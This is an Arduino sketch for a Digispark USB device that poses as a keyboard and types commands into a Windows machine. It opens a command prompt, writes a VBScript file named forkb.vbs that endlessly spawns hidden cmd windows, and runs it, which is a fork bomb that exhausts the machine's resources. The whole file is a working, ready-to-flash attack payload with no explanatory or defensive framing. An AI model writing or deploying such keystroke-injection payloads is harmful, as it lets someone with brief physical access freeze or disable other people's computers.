#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("cmd");
  delay(2000);
  DigiKeyboard.println("copy con forkb.vbs");
  delay(2000);
  DigiKeyboard.println("do");
  delay(2000);
  DigiKeyboard.println("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False");
  delay(2000);
  DigiKeyboard.println("loop");
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Z,MOD_CONTROL_LEFT);
  delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(3000);
  DigiKeyboard.println("start forkb.vbs && exit");
  while(1);
}
